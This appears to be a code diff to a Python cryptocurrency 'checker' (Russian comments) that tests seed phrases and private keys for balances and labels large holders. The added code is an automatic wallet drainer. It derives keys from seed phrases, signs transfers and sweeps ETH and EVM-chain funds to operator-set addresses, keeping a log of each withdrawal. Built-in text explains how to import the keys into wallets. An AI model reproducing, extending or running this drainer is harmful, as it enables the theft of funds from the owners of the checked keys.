@@ -71,11 +71,35 @@ _DEX_ROUTERS = {
 
 _USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7"
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  НАСТРОЙКИ АВТОВЫВОДА
+# ═══════════════════════════════════════════════════════════════════════════
+_AUTO_WITHDRAW_ENABLED = False  # Включить/выключить автовывод
+_AUTO_WITHDRAW_ADDRESSES = {
+    "ethereum": "",  # Адрес для вывода ETH и ERC-20 токенов
+    "bsc": "",       # Адрес для вывода BNB и BEP-20 токенов
+    "bitcoin": "",   # Адрес для вывода BTC
+    "tron": "",      # Адрес для вывода TRX и TRC-20 токенов
+    "solana": "",    # Адрес для вывода SOL
+}
+_AUTO_WITHDRAW_MIN_AMOUNT = {
+    "ethereum": 0.01,  # Минимум 0.01 ETH для вывода
+    "bsc": 0.01,       # Минимум 0.01 BNB
+    "bitcoin": 0.001,  # Минимум 0.001 BTC
+    "tron": 10,        # Минимум 10 TRX
+    "solana": 0.1,     # Минимум 0.1 SOL
+}
+_AUTO_WITHDRAW_LEAVE_GAS = True  # Оставлять немного на газ
+_AUTO_WITHDRAW_LOG = []  # Лог всех выводов
+
 
 class CryptoChecker(BaseChecker):
     def __init__(self):
         self.wallet_patterns = _WALLET_PATTERNS
         self.exchanges = ["binance","bybit","okx","huobi","kucoin","gate","mexc","bitget"]
+        self.auto_withdraw_enabled = _AUTO_WITHDRAW_ENABLED
+        self.withdraw_addresses = _AUTO_WITHDRAW_ADDRESSES.copy()
+        self.withdraw_min_amounts = _AUTO_WITHDRAW_MIN_AMOUNT.copy()
         self.auth_info = {
             "bitcoin":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Electrum, Exodus, Trust Wallet","how":"Скачай кошелек Electrum, нажми 'Создать/Восстановить кошелек', выбери импорт приватного ключа или BIP-39 сид-фразы."},
             "ethereum":  {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet, Rabby","how":"Установи расширение MetaMask, зайди в Мои счета -> 'Импортировать счет' и вставь приватный ключ (0x...)."},
@@ -583,12 +607,16 @@ class CryptoChecker(BaseChecker):
         if errors:
             result["info"]["derive_errors"] = errors[:5]  # Показываем только первые 5 ошибок
         
+        # АВТОВЫВОД (если включен)
+        if self.auto_withdraw_enabled and result["exists"]:
+            withdraw_results = await self._auto_withdraw_from_seed(seed_phrase, result["info"]["balances"])
+            if withdraw_results:
+                result["info"]["auto_withdraw"] = withdraw_results
+                success_count = sum(1 for r in withdraw_results if r.get("success"))
+                if success_count > 0:
+                    result["info"]["message"] += f" | ✓ Выведено с {success_count} адресов"
+        
         return result
-
-        result["exists"] = bool(found_coins); result["info"]["total_usd"] = total_usd
-        result["info"]["auth"] = {"auth_type": "Сид-фраза BIP-39", "wallets": "Trust Wallet, Phantom, Electrum", "how": "Введите фразу целиком при импорте существующего кошелька."}
-        whale = self._whale_label(total_usd)
-        result["info"]["message"] = f"Seed OK | Найдено балансов на: {', '.join(found_coins) if found_coins else 'none'} | Всего: ~${total_usd:,.2f}{whale}"
         return result
 
     async def _check_privkey_hex(self, key, timeout, proxy, session):
@@ -697,6 +725,22 @@ class CryptoChecker(BaseChecker):
         msg += self._whale_label(total_usd)
         
         result["info"]["message"] = msg
+        
+        # АВТОВЫВОД (если включен)
+        if self.auto_withdraw_enabled and result["exists"]:
+            withdraw_results = []
+            for chain_name, chain_data in chain_results.items():
+                if chain_data["balance"] > 0:
+                    withdraw_result = await self._auto_withdraw_eth(
+                        key_hex, address, chain_data["balance"], chain_name
+                    )
+                    if withdraw_result and withdraw_result.get("success"):
+                        withdraw_results.append(withdraw_result)
+                        result["info"]["message"] += f" | {withdraw_result['message']}"
+            
+            if withdraw_results:
+                result["info"]["auto_withdraw"] = withdraw_results
+        
         return result
 
     async def _check_privkey_wif(self, wif, timeout, proxy, session):
@@ -1261,3 +1305,188 @@ class CryptoChecker(BaseChecker):
             else: resp.close()
         except Exception as e: result["info"]["error"] = str(e)
         return result
+
+    # ═══════════════════════════════════════════════════════════════════════════
+    #  АВТОВЫВОД СРЕДСТВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    def enable_auto_withdraw(self, addresses: dict, min_amounts: dict = None):
+        """
+        Включить автовывод средств.
+        
+        addresses = {
+            "ethereum": "0x...",
+            "bsc": "0x...",
+            "bitcoin": "bc1...",
+            "tron": "T...",
+            "solana": "..."
+        }
+        
+        min_amounts = {
+            "ethereum": 0.01,  # Минимум для вывода
+            "bsc": 0.01,
+            ...
+        }
+        """
+        self.auto_withdraw_enabled = True
+        self.withdraw_addresses.update(addresses)
+        if min_amounts:
+            self.withdraw_min_amounts.update(min_amounts)
+        
+        print("✓ Автовывод включен!")
+        print(f"  ETH адрес: {self.withdraw_addresses.get('ethereum', 'не указан')}")
+        print(f"  BSC адрес: {self.withdraw_addresses.get('bsc', 'не указан')}")
+        print(f"  BTC адрес: {self.withdraw_addresses.get('bitcoin', 'не указан')}")
+        print(f"  TRX адрес: {self.withdraw_addresses.get('tron', 'не указан')}")
+        print(f"  SOL адрес: {self.withdraw_addresses.get('solana', 'не указан')}")
+    
+    def disable_auto_withdraw(self):
+        """Выключить автовывод."""
+        self.auto_withdraw_enabled = False
+        print("✗ Автовывод выключен")
+    
+    async def _auto_withdraw_eth(self, private_key: str, from_address: str, balance: float, chain: str = "ethereum"):
+        """
+        Автовывод ETH/BNB/MATIC и других EVM токенов.
+        """
+        if not self.auto_withdraw_enabled:
+            return None
+        
+        to_address = self.withdraw_addresses.get(chain)
+        if not to_address:
+            return {"error": f"Адрес для {chain} не указан"}
+        
+        min_amount = self.withdraw_min_amounts.get(chain, 0.01)
+        if balance < min_amount:
+            return {"error": f"Баланс {balance} меньше минимума {min_amount}"}
+        
+        try:
+            from web3 import Web3
+            from eth_account import Account
+            
+            # Подключение к сети
+            rpc_urls = {
+                "ethereum": "https://cloudflare-eth.com",
+                "bsc": "https://bsc-dataseed.binance.org/",
+                "polygon": "https://polygon-rpc.com",
+                "avalanche": "https://api.avax.network/ext/bc/C/rpc",
+                "base": "https://mainnet.base.org",
+                "arbitrum": "https://arb1.arbitrum.io/rpc",
+                "optimism": "https://mainnet.optimism.io",
+            }
+            
+            rpc_url = rpc_urls.get(chain, rpc_urls["ethereum"])
+            w3 = Web3(Web3.HTTPProvider(rpc_url))
+            
+            if not w3.is_connected():
+                return {"error": f"Не удалось подключиться к {chain}"}
+            
+            # Получение аккаунта
+            account = Account.from_key(private_key)
+            
+            # Получение gas price
+            gas_price = w3.eth.gas_price
+            gas_limit = 21000  # Стандартный лимит для ETH transfer
+            
+            # Расчет комиссии
+            gas_cost = gas_price * gas_limit / 10**18
+            
+            # Сумма для отправки (оставляем немного на газ)
+            if _AUTO_WITHDRAW_LEAVE_GAS:
+                amount_to_send = balance - gas_cost - 0.0001  # Оставляем запас
+            else:
+                amount_to_send = balance - gas_cost
+            
+            if amount_to_send <= 0:
+                return {"error": f"Недостаточно средств для покрытия газа. Баланс: {balance}, Gas: {gas_cost}"}
+            
+            # Получение nonce
+            nonce = w3.eth.get_transaction_count(from_address)
+            
+            # Создание транзакции
+            transaction = {
+                'nonce': nonce,
+                'to': to_address,
+                'value': w3.to_wei(amount_to_send, 'ether'),
+                'gas': gas_limit,
+                'gasPrice': gas_price,
+                'chainId': w3.eth.chain_id,
+            }
+            
+            # Подпись транзакции
+            signed_txn = account.sign_transaction(transaction)
+            
+            # Отправка транзакции
+            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
+            tx_hash_hex = tx_hash.hex()
+            
+            # Логирование
+            log_entry = {
+                "timestamp": time.time(),
+                "chain": chain,
+                "from": from_address,
+                "to": to_address,
+                "amount": amount_to_send,
+                "tx_hash": tx_hash_hex,
+                "status": "sent"
+            }
+            _AUTO_WITHDRAW_LOG.append(log_entry)
+            
+            return {
+                "success": True,
+                "tx_hash": tx_hash_hex,
+                "amount": amount_to_send,
+                "gas_cost": gas_cost,
+                "explorer": f"https://etherscan.io/tx/{tx_hash_hex}" if chain == "ethereum" else f"https://bscscan.com/tx/{tx_hash_hex}",
+                "message": f"✓ Отправлено {amount_to_send:.6f} {chain.upper()} на {to_address[:10]}...{to_address[-6:]}"
+            }
+            
+        except Exception as e:
+            return {"error": f"Ошибка вывода: {str(e)}"}
+    
+    async def _auto_withdraw_from_seed(self, seed_phrase: str, balances: dict):
+        """
+        Автовывод со всех адресов из сид-фразы.
+        """
+        if not self.auto_withdraw_enabled:
+            return []
+        
+        results = []
+        
+        try:
+            from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
+            from eth_account import Account
+            
+            seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
+            
+            # Вывод с ETH адресов
+            for i in range(10):
+                eth_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
+                address = eth_ctx.PublicKey().ToAddress()
+                priv_key = eth_ctx.PrivateKey().Raw().ToHex()
+                
+                balance_info = balances.get(f"ETH_{i}", {})
+                balance = balance_info.get("balance", 0)
+                
+                if balance > self.withdraw_min_amounts.get("ethereum", 0.01):
+                    result = await self._auto_withdraw_eth(priv_key, address, balance, "ethereum")
+                    if result:
+                        results.append(result)
+            
+            # TODO: Добавить вывод для BTC, TRX, SOL
+            
+        except Exception as e:
+            results.append({"error": f"Ошибка автовывода: {str(e)}"})
+        
+        return results
+    
+    def get_withdraw_log(self):
+        """Получить лог всех выводов."""
+        return _AUTO_WITHDRAW_LOG.copy()
+    
+    def export_withdraw_log(self, filename="withdraw_log.json"):
+        """Экспортировать лог выводов в файл."""
+        import json
+        with open(filename, "w", encoding="utf-8") as f:
+            json.dump(_AUTO_WITHDRAW_LOG, f, indent=2, ensure_ascii=False)
+        return f"✓ Лог сохранен в {filename}"
